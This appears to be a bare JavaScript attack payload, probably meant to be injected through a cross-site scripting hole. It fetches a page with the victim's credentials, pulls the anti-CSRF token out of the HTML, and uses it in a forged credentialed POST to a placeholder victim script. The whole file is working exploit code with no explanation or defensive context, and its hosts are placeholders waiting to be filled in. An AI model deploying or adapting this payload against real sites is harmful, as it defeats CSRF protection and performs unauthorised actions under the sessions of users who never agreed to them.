function attack(token) {
    var url =  "http://URL/VICTIM_SCRIPT.php";
    var params =  "param1=test1&CSRFToken="+token;
    var CSRF = new XMLHttpRequest();
    CSRF.open("POST", url, true);
    CSRF.withCredentials = 'true';
    CSRF.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    CSRF.send(params);
}

var url = "http://URL/CSRF_SCRIPT.php";
var req = new XMLHttpRequest();
req.open("GET", url, true);
req.withCredentials = 'true';
req.onreadystatechange = function() {
    if(req.readyState == 4) {
        var html = req.responseText;
        var parser = new DOMParser().parseFromString(html, "text/html");
        var token = parser.getElementById('CSRFToken').value;
        attack(token);
    }
}
req.send();
